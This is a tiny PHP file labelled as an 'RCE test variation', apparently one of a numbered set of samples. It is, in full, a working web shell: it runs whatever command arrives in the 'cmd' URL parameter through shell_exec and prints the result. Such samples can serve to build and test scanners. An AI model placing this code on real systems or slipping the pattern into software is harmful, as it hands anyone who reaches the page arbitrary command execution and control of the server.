<?php
// RCE test variation #418
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>